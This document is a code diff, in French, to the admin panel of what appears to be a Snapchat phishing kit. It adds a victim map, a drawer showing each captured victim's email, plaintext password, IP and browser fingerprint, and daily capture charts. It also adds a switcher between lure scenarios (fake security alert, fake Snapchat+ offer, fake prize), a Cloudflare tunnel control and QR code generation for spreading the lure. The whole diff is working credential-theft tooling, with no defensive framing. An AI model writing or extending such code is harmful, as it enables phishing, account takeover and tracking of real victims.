@@ -183,6 +183,7 @@ tr:hover{background:var(--surface)}
         <div class="nav-item active" data-panel="overview"><span class="mat">dashboard</span><span class="nav-label">Overview</span><span class="count" id="nav-captures">0</span></div>
         <div class="nav-item" data-panel="live"><span class="mat">terminal</span><span class="nav-label">Live Feed</span></div>
         <div class="nav-item" data-panel="targets"><span class="mat">groups</span><span class="nav-label">Targets</span><span class="count" id="nav-targets">0</span></div>
+        <div class="nav-item" data-panel="recon"><span class="mat">language</span><span class="nav-label">Recon</span></div>
         <div class="nav-item" data-panel="campaigns"><span class="mat">ads_click</span><span class="nav-label">Campaigns</span></div>
         <div class="nav-item" data-panel="vote"><span class="mat">leaderboard</span><span class="nav-label">Classement</span><span class="count" id="nav-votes">0</span></div>
         <div class="nav-item" data-panel="tools"><span class="mat">build</span><span class="nav-label">Tools</span></div>
@@ -241,13 +242,52 @@ tr:hover{background:var(--surface)}
         <!-- ========== TARGETS ========== -->
         <div class="panel" id="panel-targets">
             <h2>Targets</h2>
-            <p class="sub">Toutes les cibles capturées</p>
+            <p class="sub">Toutes les cibles capturées · Cliquez une ligne pour les détails</p>
             <div class="filter-bar">
                 <div class="search-wrap"><span class="mat">search</span><input class="input-dark" id="target-search" placeholder="Rechercher..."></div>
                 <select id="target-filter-os"><option value="all">Tous OS</option><option>Windows</option><option>macOS</option><option>iOS</option><option>Android</option></select>
                 <button class="btn btn-ghost btn-sm" id="refresh-targets">Actualiser</button>
             </div>
             <div class="card" style="padding:0;overflow-x:auto"><table><thead><tr><th></th><th>Pseudo</th><th>Email</th><th>Mot de passe</th><th>IP</th><th>OS</th><th>Date</th></tr></thead><tbody id="targets-table"></tbody></table></div>
+        </div>
+
+        <!-- ========== RECON ========== -->
+        <div class="panel" id="panel-recon">
+            <h2>Reconnaissance</h2>
+            <p class="sub">Carte des cibles actives</p>
+            <div class="card" style="position:relative;overflow:hidden;height:480px">
+                <svg id="world-map" style="width:100%;height:100%" viewBox="0 0 1000 500">
+                    <!-- Continents (simplified) -->
+                    <path d="M80,120 Q120,80 160,100 Q180,110 200,90 Q220,70 260,80 Q280,60 300,100 L320,130 Q310,160 280,170 L250,180 Q230,200 210,210 L180,200 Q150,190 130,170 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M260,80 Q300,50 340,60 Q360,70 380,50 Q400,40 430,60 Q450,70 470,90 Q480,110 450,130 Q430,140 400,130 Q380,140 360,130 Q340,120 320,130 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M400,130 Q420,110 450,130 Q470,140 490,160 Q500,180 480,200 Q460,210 440,220 Q420,210 410,190 Q400,170 400,150 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M480,200 Q520,180 560,190 Q580,200 600,220 Q620,240 640,230 Q660,220 670,240 Q660,260 640,270 Q620,280 600,290 Q580,300 560,290 Q540,280 520,270 Q500,250 490,230 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M560,100 Q600,80 650,90 Q680,100 700,120 Q710,140 690,150 Q670,160 650,150 Q630,140 610,130 Q590,120 570,110 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M700,120 Q740,100 780,110 Q800,120 820,140 Q840,160 830,180 Q810,200 790,210 Q770,220 750,210 Q730,200 720,180 Q710,160 700,140 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <path d="M640,230 Q670,210 700,220 Q720,240 730,260 Q740,280 720,290 Q700,300 680,290 Q660,280 650,260 Z" fill="rgba(10,114,239,0.05)" stroke="rgba(10,114,239,0.15)" stroke-width="0.5"/>
+                    <!-- Sonar sweep -->
+                    <circle id="sonar-ring" cx="500" cy="250" r="0" fill="none" stroke="rgba(10,114,239,0.08)" stroke-width="2">
+                        <animate attributeName="r" from="50" to="350" dur="4s" repeatCount="indefinite"/>
+                        <animate attributeName="opacity" from="0.6" to="0" dur="4s" repeatCount="indefinite"/>
+                    </circle>
+                    <circle id="sonar-ring-2" cx="500" cy="250" r="0" fill="none" stroke="rgba(10,114,239,0.05)" stroke-width="1">
+                        <animate attributeName="r" from="50" to="350" dur="4s" begin="2s" repeatCount="indefinite"/>
+                        <animate attributeName="opacity" from="0.4" to="0" dur="4s" begin="2s" repeatCount="indefinite"/>
+                    </circle>
+                    <circle cx="500" cy="250" r="50" fill="none" stroke="rgba(10,114,239,0.06)" stroke-width="0.5"/>
+                    <circle cx="500" cy="250" r="150" fill="none" stroke="rgba(10,114,239,0.04)" stroke-width="0.5"/>
+                    <circle cx="500" cy="250" r="300" fill="none" stroke="rgba(10,114,239,0.03)" stroke-width="0.5"/>
+                    <!-- Targets dots rendered by JS -->
+                    <g id="recon-targets"></g>
+                    <!-- Center dot -->
+                    <circle cx="500" cy="250" r="3" fill="rgba(10,114,239,0.4)"/>
+                    <circle cx="500" cy="250" r="1.5" fill="#0a72ef"/>
+                </svg>
+                <div style="position:absolute;bottom:12px;left:16px;font-size:11px;color:var(--text-tertiary);font-family:var(--mono)">
+                    <span style="display:inline-block;width:6px;height:6px;border-radius:50%;background:#ff5b4f;margin-right:4px"></span> Actif
+                    <span style="display:inline-block;width:6px;height:6px;border-radius:50%;background:#00FF99;margin-right:4px;margin-left:12px"></span> Récent
+                </div>
+            </div>
         </div>
 
         <!-- ========== CAMPAIGNS ========== -->
@@ -386,22 +426,26 @@ async function loadOverview(){
         '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Firefox</div><div class="val" style="font-size:20px">'+(d.devices?.firefox||0)+'</div></div>'+
         '<div class="kpi" style="box-shadow:none;padding:4px 8px;background:transparent"><div class="lbl">Autres</div><div class="val" style="font-size:20px">'+(d.devices?.other||0)+'</div></div>';
 
-    // Chart 7 days - mock for now
+    // Chart 7 days - real data from daily_stats
     const chart = document.getElementById('chart-7d');
     chart.innerHTML = '';
-    const days = ['Lun','Mar','Mer','Jeu','Ven','Sam','Dim'];
-    const vals = [12,18,8,24,30,15,22];
-    const max = Math.max(...vals);
+    const days = (d.daily_stats||[]).slice().reverse();
+    const maxCount = Math.max(...days.map(x=>x.count), 1);
     const accent = getComputedStyle(document.documentElement).getPropertyValue('--accent').trim() || '#0a72ef';
-    days.forEach((d,i) => {
-        const h = (vals[i]/max)*100;
+    const dayNames = ['Dim','Lun','Mar','Mer','Jeu','Ven','Sam'];
+    days.forEach(day => {
+        const h = (day.count/maxCount)*100;
         const bar = document.createElement('div');
         bar.className = 'bar';
         bar.style.height = h+'%';
         bar.style.background = 'linear-gradient(to top, '+accent+', rgba(10,114,239,0.3))';
-        bar.innerHTML = '<div class="bl">'+d+'</div>';
+        const d = new Date(day.date);
+        bar.innerHTML = '<div class="bl">'+(dayNames[d.getDay()]||'?')+'</div>';
         chart.appendChild(bar);
     });
+    if(days.length === 0){
+        chart.innerHTML = '<div style="color:var(--text-tertiary);font-size:13px;text-align:center;padding:40px 0">Aucune donnée cette semaine</div>';
+    }
 
     // DB stats for settings
     document.getElementById('db-captures').textContent = d.captures || 0;
@@ -594,6 +638,187 @@ loadLive();
 
 // Poll overview every 30s
 setInterval(loadOverview, 30000);
+</script>
+
+
+<!-- Target Drawer -->
+<div id="target-drawer" style="position:fixed;top:0;right:-500px;width:420px;max-width:90vw;height:100vh;background:#12121a;z-index:200;border-left:1px solid rgba(255,255,255,0.05);overflow-y:auto;transition:right 0.3s ease;padding:24px;box-shadow:-10px 0 30px rgba(0,0,0,0.3)">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px">
+        <h3 style="font-size:16px;font-weight:600;display:flex;align-items:center;gap:8px"><span class="mat" style="font-size:20px;color:var(--accent-red)">person</span> <span id="drawer-title">Details cible</span></h3>
+        <span class="mat" id="drawer-close" style="font-size:22px;cursor:pointer;color:var(--text-tertiary);padding:4px">close</span>
+    </div>
+    <div id="drawer-content" style="font-size:13px;line-height:2">
+        <div style="background:rgba(255,255,255,0.02);border-radius:8px;padding:16px;margin-bottom:16px">
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">ID</span><span style="font-family:var(--mono);font-size:12px" id="dr-id">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">Pseudo</span><span style="font-family:var(--mono);font-size:12px;color:var(--accent)" id="dr-pseudo">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">Email</span><span style="font-family:var(--mono);font-size:12px" id="dr-email">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">Mot de passe</span><span style="font-family:var(--mono);font-size:12px;color:var(--accent-red)" id="dr-password">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">IP</span><span style="font-family:var(--mono);font-size:12px" id="dr-ip">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(255,255,255,0.03)"><span style="color:var(--text-secondary)">Date</span><span style="font-family:var(--mono);font-size:12px" id="dr-date">-</span></div>
+        </div>
+        <div style="background:rgba(0,255,153,0.02);border-radius:8px;padding:16px;margin-bottom:16px">
+            <h4 style="font-size:12px;color:var(--text-secondary);margin-bottom:8px;text-transform:uppercase;letter-spacing:0.08em">🧬 Fingerprint</h4>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">OS</span><span style="font-family:var(--mono);font-size:11px" id="dr-os">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Navigateur</span><span style="font-family:var(--mono);font-size:11px" id="dr-browser">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Ecran</span><span style="font-family:var(--mono);font-size:11px" id="dr-screen">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Fuseau</span><span style="font-family:var(--mono);font-size:11px" id="dr-tz">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Langue</span><span style="font-family:var(--mono);font-size:11px" id="dr-lang">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Clics</span><span style="font-family:var(--mono);font-size:11px" id="dr-clicks">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Temps page</span><span style="font-family:var(--mono);font-size:11px" id="dr-timepage">-</span></div>
+            <div class="row" style="display:flex;justify-content:space-between;padding:4px 0"><span style="color:var(--text-secondary);font-size:12px">Referrer</span><span style="font-family:var(--mono);font-size:11px" id="dr-referrer">-</span></div>
+        </div>
+    </div>
+</div>
+
+<script>
+// ── Target Drawer ──
+function openDrawer(data){
+    document.getElementById('dr-id').textContent = '#'+data.id;
+    document.getElementById('dr-pseudo').textContent = data.pseudo||data.username||'-';
+    document.getElementById('dr-email').textContent = data.username||data.accountIdentifier||'-';
+    document.getElementById('dr-password').textContent = data.password||'-';
+    document.getElementById('dr-ip').textContent = data.ip_address||data.ip||'-';
+    document.getElementById('dr-date').textContent = data.timestamp||'-';
+    document.getElementById('dr-os').textContent = data.platform||'-';
+    document.getElementById('dr-screen').textContent = data.screen||'-';
+    document.getElementById('dr-tz').textContent = data.timezone||'-';
+    document.getElementById('dr-lang').textContent = data.lang||'-';
+    document.getElementById('dr-clicks').textContent = data.clicks||'0';
+    document.getElementById('dr-timepage').textContent = data.time_on_page?data.time_on_page+'s':'-';
+    document.getElementById('dr-referrer').textContent = data.referrer||'-';
+    document.getElementById('dr-step').textContent = data.step||'-';
+    // Browser from user_agent
+    var ua = (data.user_agent||'').toLowerCase();
+    var browser = 'Inconnu';
+    if(ua.includes('chrome')) browser = 'Chrome';
+    else if(ua.includes('firefox')) browser = 'Firefox';
+    else if(ua.includes('safari')) browser = 'Safari';
+    else if(ua.includes('edge')) browser = 'Edge';
+    document.getElementById('dr-browser').textContent = browser;
+    document.getElementById('target-drawer').style.right = '0';
+}
+document.getElementById('drawer-close')?.addEventListener('click', function(){
+    document.getElementById('target-drawer').style.right = '-500px';
+});
+// Close drawer on escape
+document.addEventListener('keydown', function(e){
+    if(e.key === 'Escape') document.getElementById('target-drawer').style.right = '-500px';
+});
+
+// ── Targets table with drawer click ──
+// Override loadTargets to add click handler
+var origLoadTargets = loadTargets;
+loadTargets = async function(){
+    await origLoadTargets();
+    document.querySelectorAll('#targets-table tr').forEach(function(tr, i){
+        tr.style.cursor = 'pointer';
+        tr.addEventListener('click', function(){
+            // Get data from API
+            fetch('/api/captures').then(function(r){return r.json()}).then(function(caps){
+                if(caps && caps[i]) openDrawer(caps[i]);
+            });
+        });
+    });
+};
+
+// ── Recon / Radar ──
+function loadRecon(){
+    fetch('/api/recon').then(function(r){return r.json()}).then(function(data){
+        var g = document.getElementById('recon-targets');
+        g.innerHTML = '';
+        (data.targets||[]).forEach(function(t){
+            var dot = document.createElementNS('http://www.w3.org/2000/svg','circle');
+            var x = 500 + (t.lng/180)*400;
+            var y = 250 - (t.lat/90)*220;
+            dot.setAttribute('cx', Math.max(20,Math.min(980,x)));
+            dot.setAttribute('cy', Math.max(20,Math.min(480,y)));
+            dot.setAttribute('r', '4');
+            dot.setAttribute('fill', '#ff5b4f');
+            dot.setAttribute('opacity', '0.8');
+            dot.innerHTML = '<title>'+t.username+' ('+t.city+')</title>';
+            g.appendChild(dot);
+        });
+    });
+}
+
+// ── Campaign Switcher ──
+function loadCampaigns(){
+    fetch('/api/campaign/active').then(function(r){return r.json()}).then(function(active){
+        var scenarios = [
+            {id:'classement',name:'🏆 Classement Secret',desc:'Jeu de vote anonyme'},
+            {id:'securite',name:'🔐 Alerte Securite',desc:'Fausse alerte Snapchat'},
+            {id:'snapchat_plus',name:'🎁 Snapchat+',desc:'Offre gratuite'},
+            {id:'cadeau',name:'🎀 Cadeau',desc:'Concours gagnant'},
+        ];
+        var list = document.getElementById('campaigns-list');
+        list.innerHTML = scenarios.map(function(s){
+            var isActive = s.id === (active.active||'classement');
+            return '<div class="camp-card">'+
+                '<h4>'+s.name+'</h4>'+
+                '<div class="meta"><span class="badge '+(isActive?'badge-green':'badge-red')+'">'+(isActive?'● Active':'● Inactive')+'</span><span style="color:var(--text-tertiary)">'+s.desc+'</span></div>'+
+                '<button class="btn btn-ghost btn-xs" onclick="activateScenario(''+s.id+'')">'+(isActive?'Deja active':'Activer')+'</button>'+
+                '</div>';
+        }).join('');
+    });
+}
+
+function activateScenario(id){
+    fetch('/api/campaign/active', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({scenario:id})})
+    .then(function(){loadCampaigns();});
+}
+
+// ── Tunnel Control ──
+function startTunnel(){
+    var btn = document.getElementById('tunnel-btn');
+    btn.textContent = '✦ Demarrage...';
+    btn.disabled = true;
+    fetch('/api/tunnel/start', {method:'POST'}).then(function(r){return r.json()}).then(function(d){
+        btn.textContent = d.ok ? '✅ Tunnel actif' : '❌ Erreur';
+        setTimeout(function(){btn.textContent = '🔄 Arreter le tunnel'; btn.disabled = false;}, 2000);
+        if(d.ok) document.getElementById('tunnel-url').textContent = 'Demarrage...';
+    });
+}
+function stopTunnel(){
+    fetch('/api/tunnel/stop', {method:'POST'}).then(function(){
+        document.getElementById('tunnel-btn').textContent = '🔌 Demarrer le tunnel';
+        document.getElementById('tunnel-url').textContent = '-';
+    });
+}
+// Add tunnel UI to settings
+setTimeout(function(){
+    var settingsCards = document.querySelectorAll('.settings-card');
+    if(settingsCards.length > 2){
+        // Add tunnel card after settings
+        var tunnelCard = document.createElement('div');
+        tunnelCard.className = 'settings-card';
+        tunnelCard.innerHTML = '<h4>Tunnel Cloudflare</h4>'+
+            '<button class="btn btn-primary btn-sm" id="tunnel-btn" onclick="startTunnel()" style="width:100%;margin-bottom:6px">🔌 Demarrer le tunnel</button>'+
+            '<div class="row"><span>Statut</span><span class="val" id="tunnel-url">-</span></div>';
+        settingsCards[2].parentNode.appendChild(tunnelCard);
+    }
+}, 100);
+
+// ── QR Code inline ──
+document.getElementById('qr-btn')?.addEventListener('click', function(){
+    var url = document.getElementById('qr-url').value || window.location.origin;
+    var img = document.getElementById('qr-result');
+    if(!img){
+        img = document.createElement('img');
+        img.id = 'qr-result';
+        img.style.cssText = 'margin-top:12px;border-radius:8px;width:100%;max-width:200px;display:block;margin-left:auto;margin-right:auto';
+        this.parentNode.appendChild(img);
+    }
+    img.src = 'https://api.qrserver.com/v1/create-qr-code/?size=300x300&data='+encodeURIComponent(url);
+});
+
+// ── Navigation: load recon on panel switch ──
+document.querySelectorAll('.nav-item').forEach(function(item){
+    item.addEventListener('click', function(){
+        var panel = this.dataset.panel;
+        if(panel === 'recon') loadRecon();
+        if(panel === 'targets') setTimeout(loadTargets, 50);
+    });
+});
 </script>
 </body>
 </html>
